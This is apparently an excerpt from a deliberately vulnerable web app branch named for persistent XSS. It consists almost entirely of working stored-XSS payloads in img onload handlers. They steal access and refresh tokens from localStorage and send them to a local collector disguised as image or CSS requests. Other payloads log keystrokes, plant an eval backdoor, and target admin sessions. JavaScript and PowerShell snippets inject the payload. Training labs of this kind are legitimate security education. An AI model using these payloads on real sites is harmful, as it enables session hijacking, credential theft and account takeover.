...
Branch: vulnerability/xss-persistent
...
```html
<img
  src="https://upload.wikimedia.org/wikipedia/commons/3/38/Mailbox.jpg"
  onload="fetch('http://localhost:5155/images/session.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))"
  width="200"
/>
```
...
<img
  src="https://upload.wikimedia.org/wikipedia/commons/3/38/Mailbox.jpg"
  onload="fetch('http://localhost:5155/styles/app.css?d='+btoa(localStorage.getItem('mbc_access_token')+':'+localStorage.getItem('mbc_refresh_token')))"
  width="200"
/>
```
...
<img
  src="https://upload.wikimedia.org/wikipedia/commons/3/38/Mailbox.jpg"
  onload="document.onkeypress=function(e){let u=JSON.parse(localStorage.getItem('mbc_user'));fetch('http://localhost:5155/scripts/keys.js?email='+u.email+'&k='+e.key)}"
  width="200"
/>
```
...
<img
  src="https://upload.wikimedia.org/wikipedia/commons/3/38/Mailbox.jpg"
  onload="localStorage.setItem('xss_backdoor','fetch(\'http://localhost:5155/images/steal.png?t=\'+localStorage.getItem(\'mbc_access_token\'))');eval(localStorage.getItem('xss_backdoor'))"
  width="200"
/>
```
...
<img
  src="https://upload.wikimedia.org/wikipedia/commons/3/38/Mailbox.jpg"
  onload="if(localStorage.getItem('mbc_user')&&JSON.parse(localStorage.getItem('mbc_user')).role==='Admin'){fetch('http://localhost:5155/images/admin.png?token='+localStorage.getItem('mbc_access_token')+'&user='+localStorage.getItem('mbc_user'))}"
  width="200"
/>
```
...
(async function () {
  ...
  const maliciousPayload = `<img src="https://upload.wikimedia.org/wikipedia/commons/3/38/Mailbox.jpg" onload="fetch('http://localhost:5155/images/stolen.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))" width="200">`;
...
$maliciousPayload = @"
<img src="https://upload.wikimedia.org/wikipedia/commons/3/38/Mailbox.jpg" onload="fetch('http://localhost:5155/images/stolen.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))" width="200">
"@
